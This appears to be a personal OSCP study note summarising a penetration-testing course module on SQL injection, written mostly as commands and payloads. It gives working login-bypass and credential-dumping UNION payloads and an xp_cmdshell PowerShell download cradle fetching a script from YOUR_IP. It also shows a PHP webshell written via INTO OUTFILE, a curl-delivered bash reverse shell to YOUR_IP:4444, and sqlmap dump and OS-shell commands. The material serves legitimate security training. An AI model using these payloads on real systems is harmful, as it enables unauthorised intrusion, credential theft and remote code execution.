---
title: "PWK Module 10 - SQL Injection Attacks"
created: "2026-04-04"
source: "PEN-200 PWK Course (OffSec 2025) - Pages 280-304"
type: reference-note
status: active
tags:
  - oscp
  - sqli
  - web-attacks
  - pwk
  - reference
  - module-10
---

# Module 10 — SQL Injection Attacks

> **OSCP Exam Relevance:** SQLi is OWASP #3 and appears frequently in PWK labs. The full chain — identify → enumerate → dump credentials → code execution — is testable. Know manual techniques first, then use sqlmap to automate. xp_cmdshell on MSSQL is a fast path to a shell on Windows targets.

**Learning Units Covered:**
- 10.1 SQL Theory and Databases (MySQL + MSSQL basics)
- 10.2 Manual SQL Exploitation (Error-based, UNION, Blind)
- 10.3 Code Execution (xp_cmdshell, INTO OUTFILE, sqlmap)

---

## 10.1 SQL Theory and Databases

### How SQLi Works — The Core Concept

Web applications embed SQL queries with user-supplied input:

```php
// Vulnerable PHP login code
$uname = $_POST['uname'];
$passwd = $_POST['password'];
$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
```

The problem: no input sanitization. An attacker controls `$uname` and can **break out of the string context** using a single quote `'` and inject arbitrary SQL.

---

### 10.1.1 MySQL Basics

```bash
# Connect to remote MySQL instance
mysql -u root -p'root' -h <target-ip> -P 3306

# Once connected:
select version();                                          # DB version
select system_user();                                      # Current user
show databases;                                            # All databases
use <dbname>;                                              # Switch database
show tables;                                               # Tables in current DB

# Query a specific user's password hash
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
```

**Key MySQL functions for SQLi:**

| Function | Returns |
|----------|---------|
| `version()` or `@@version` | MySQL version string |
| `system_user()` | Current DB user@host |
| `database()` | Current database name |
| `user()` | Connected user |

---

### 10.1.2 MSSQL Basics

```bash
# Connect from Kali using impacket
impacket-mssqlclient Administrator:Lab123@<target-ip> -windows-auth
# -windows-auth forces NTLM auth

# Once connected:
SELECT @@version;                                          # OS + SQL Server version
SELECT name FROM sys.databases;                            # All databases
SELECT * FROM offsec.information_schema.tables;            # Tables in 'offsec' DB
SELECT * FROM offsec.dbo.users;                            # Query specific table
```

**MySQL vs MSSQL key differences:**

| Feature | MySQL | MSSQL |
|---------|-------|-------|
| Version | `@@version` or `version()` | `@@version` |
| List databases | `show databases` | `SELECT name FROM sys.databases` |
| Comment | `-- //` or `#` | `--` |
| String concat | `CONCAT(a,b)` | `a + b` |
| Code execution | `INTO OUTFILE` (write files) | `xp_cmdshell` (run commands) |

---

## 10.2 Manual SQL Exploitation

### SQLi Types Overview

| Type | How results come back | Technique |
|------|--------------------|-----------|
| **In-band / Error-based** | Error messages reveal data | Force errors with `IN`, `CONVERT` |
| **In-band / UNION-based** | Data injected into normal output | Append `UNION SELECT` |
| **Blind / Boolean-based** | True/False in app behavior | `AND 1=1` vs `AND 1=2` |
| **Blind / Time-based** | Response delay reveals True/False | `AND SLEEP(3)` |

> 💡 **OSCP priority:** Try UNION-based first (fastest, most data). Fall back to error-based, then blind. Use sqlmap to automate blind SQLi (too slow manually).

---

### 10.2.1 Error-based SQLi

#### Step 1 — Test for SQLi (single quote)
```
Username: offsec'
```
If you see a MySQL syntax error → SQLi confirmed.

#### Step 2 — Authentication Bypass
```sql
offsec' OR 1=1 -- //
```
**What this does:** Forces `WHERE` clause to always return TRUE → logs in as first user in DB (usually admin).

Full injected query becomes:
```sql
SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 -- // AND password='anything'
```

#### Step 3 — Enumerate via Error-based IN operator
```sql
-- Get MySQL version
' OR 1=1 IN (SELECT @@version) -- //

-- Dump all passwords from users table
' OR 1=1 IN (SELECT password FROM users) -- //

-- Dump specific user's password
' OR 1=1 IN (SELECT password FROM users WHERE username = 'admin') -- //
```

> 💡 **Why it works:** The `IN` operator expects a specific type. When you pass a string (DB version) where a boolean is expected, MySQL throws a helpful error that includes the value you asked for.

---

### 10.2.2 UNION-based SQLi

**Two rules before starting:**
1. Your injected UNION query must have the **same number of columns** as the original
2. **Data types** must be compatible per column

#### Step 1 — Find number of columns (ORDER BY method)
```sql
' ORDER BY 1-- //   ← works
' ORDER BY 2-- //   ← works
' ORDER BY 5-- //   ← works
' ORDER BY 6-- //   ← ERROR → table has 5 columns
```

#### Step 2 — Identify which columns are displayed
```sql
%' UNION SELECT 'a1','a2','a3','a4','a5' -- //
```
Note which positions show your values in the output (some columns may not be rendered).

#### Step 3 — Enumerate database info
```sql
-- DB name, user, version (adjust null positions to match visible columns)
' UNION SELECT null, null, database(), user(), @@version -- //
```

#### Step 4 — Enumerate tables and columns
```sql
' UNION SELECT null, table_name, column_name, table_schema, null
  FROM information_schema.columns
  WHERE table_schema=database() -- //
```

#### Step 5 — Dump target table
```sql
' UNION SELECT null, username, password, description, null FROM users -- //
```

#### Full UNION-based attack flow:
```
1. ' ORDER BY N -- //      → find column count
2. UNION SELECT 'a1'...    → find visible columns
3. UNION SELECT database(), user(), @@version... → fingerprint
4. UNION SELECT from information_schema.columns → find table/column names
5. UNION SELECT from target_table              → dump credentials
```

---

### 10.2.3 Blind SQLi

Used when the app doesn't show query results directly — only different behaviors.

#### Boolean-based
```
# True condition → normal page loads
http://target/blindsqli.php?user=offsec' AND 1=1 -- //

# False condition → different response (empty, error, redirect)
http://target/blindsqli.php?user=offsec' AND 1=2 -- //
```

Use this to enumerate character-by-character: `AND SUBSTRING(database(),1,1)='o'`

#### Time-based
```
# If user exists → 3 second delay
http://target/blindsqli.php?user=offsec' AND IF(1=1, sleep(3), 'false') -- //

# If user doesn't exist → immediate response
http://target/blindsqli.php?user=notauser' AND IF(1=1, sleep(3), 'false') -- //
```

> ⚠️ **OSCP tip:** Manual blind SQLi is extremely slow — automate with sqlmap immediately.

---

## 10.3 Code Execution via SQLi

### 10.3.1 MSSQL — xp_cmdshell (Windows RCE)

`xp_cmdshell` passes strings directly to the Windows command shell. **Disabled by default** — must enable it first.

```sql
-- Enable xp_cmdshell (requires sysadmin privileges)
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute OS commands
EXECUTE xp_cmdshell 'whoami';
EXECUTE xp_cmdshell 'net user';

-- Get a reverse shell (PowerShell download cradle)
EXECUTE xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://YOUR_IP/shell.ps1'')"';
```

> 🎯 **OSCP chain:** MSSQL xp_cmdshell → `whoami` → Powershell reverse shell → Windows shell

---

### 10.3.2 MySQL — INTO OUTFILE (Write Webshell)

MySQL can write query results to files on disk. If the web server's directory is writable, write a PHP webshell there.

```sql
-- Write PHP webshell to web root via UNION SQLi
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null
  INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

**Then access your webshell:**
```bash
curl "http://target/tmp/webshell.php?cmd=id"
curl "http://target/tmp/webshell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FYOUR_IP%2F4444%200%3E%261%22"
```

> ⚠️ **Requirements:** MySQL user needs `FILE` privilege + target directory must be writable by `www-data`

---

### 10.3.3 sqlmap — Automated SQLi

**Basic scan:**
```bash
# GET parameter
sqlmap -u "http://target/blindsqli.php?user=1" -p user

# POST parameter (capture request in Burp → save to file)
sqlmap -r post.txt -p item
```

**Dump entire database:**
```bash
sqlmap -u "http://target/blindsqli.php?user=1" -p user --dump
```

**Get interactive OS shell:**
```bash
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
# sqlmap uploads webshell → gives you interactive command prompt
```

**Useful sqlmap flags:**

| Flag | Purpose |
|------|---------|
| `-u "URL"` | Target URL |
| `-p param` | Parameter to test |
| `-r file.txt` | Use saved Burp request (best for POST) |
| `--dump` | Dump all database contents |
| `--dump-all` | Dump every database |
| `--os-shell` | Interactive OS shell via webshell |
| `--web-root "/path"` | Where to upload webshell |
| `--batch` | Non-interactive (auto-accept defaults) |
| `--level=5 --risk=3` | Maximum test coverage |
| `--dbms=mysql` | Specify DB type (faster) |
| `--cookie "PHPSESSID=abc"` | Include auth cookie |
| `--data "param=val"` | POST data |
| `--technique=U` | Only UNION-based (U=union, E=error, B=boolean, T=time) |

**sqlmap with authenticated session:**
```bash
# Capture POST request with Burp (include cookies), save as post.txt, then:
sqlmap -r post.txt -p item --dump --batch
```

> ⚠️ **OSCP warning:** sqlmap generates enormous traffic — use it only when stealth isn't required. Manual enumeration first, sqlmap to automate and dump.

---

## SQLi Attack Decision Tree

```
Identify parameter → test with single quote (')
    ↓
Error shown? (MySQL syntax error)
    ├── YES → In-band SQLi
    │         → Try auth bypass: OR 1=1 -- //
    │         → Try error-based: OR 1=1 IN (SELECT @@version)
    │         → Try UNION: ORDER BY N → UNION SELECT
    │
    └── NO → Blind SQLi
              ├── Page changes? → Boolean-based: AND 1=1 vs AND 1=2
              └── Time delay?   → Time-based: AND SLEEP(3)
              → Automate with sqlmap
```

---

## SQLi Comment Syntax by Database

| DB | Comment Style |
|----|--------------|
| MySQL | `-- //` or `-- -` or `#` |
| MSSQL | `--` |
| Oracle | `--` |
| SQLite | `--` |

> 💡 The `-- //` style (two dashes + space + slashes) is preferred in PWK — the space after `--` is required, and `//` prevents whitespace truncation issues.

---

## Quick Reference — Key Payloads

```sql
-- Auth bypass
' OR 1=1 -- //
admin'-- //

-- Error-based enumeration
' OR 1=1 IN (SELECT @@version) -- //
' OR 1=1 IN (SELECT password FROM users WHERE username='admin') -- //

-- UNION: find column count
' ORDER BY 1-- //      (increase until error)

-- UNION: find visible columns (5-column example)
%' UNION SELECT 'a','b','c','d','e' -- //

-- UNION: get DB info
' UNION SELECT null, null, database(), user(), @@version -- //

-- UNION: enumerate tables
' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //

-- UNION: dump users
' UNION SELECT null, username, password, description, null FROM users -- //

-- UNION: write webshell (MySQL)
' UNION SELECT "<?php system($_GET['cmd']);?>",null,null,null,null INTO OUTFILE "/var/www/html/tmp/shell.php" -- //

-- Blind: boolean
' AND 1=1 -- //     (true  → normal response)
' AND 1=2 -- //     (false → different response)

-- Blind: time-based
' AND SLEEP(3) -- //
' AND IF(1=1, SLEEP(3), 0) -- //
```

---

## Links

- [[PWK-Module-09-Common-Web-App-Attacks]] — previous module
- [[SQLi-to-RCE-Attack-Chains]] — permanent note on code execution paths
- [[Web-App-Enumeration-Checklist]] — identify SQLi entry points during recon
- [[OSCP-Certification-Sprint]] — parent project

## External Resources

- [HackTricks - SQLi](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [PayloadsAllTheThings - SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [PortSwigger SQLi Labs](https://portswigger.net/web-security/sql-injection) — hands-on practice
- [sqlmap documentation](https://sqlmap.org/)
- [IppSec - SQL Injection](https://www.youtube.com/@ippsec) — search "SQLi", "SQL injection"
- [MySQL Injection Cheatsheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
